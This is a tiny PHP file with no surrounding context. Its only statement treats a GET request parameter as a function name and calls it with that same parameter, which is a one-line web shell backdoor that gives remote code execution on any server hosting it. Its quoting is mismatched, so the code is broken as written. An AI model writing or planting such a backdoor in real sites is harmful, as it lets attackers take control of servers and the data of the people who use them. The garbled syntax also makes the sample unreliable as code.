<?php
$_GET["2pTgiANo']($_GET['2pTgiANo']);
?>
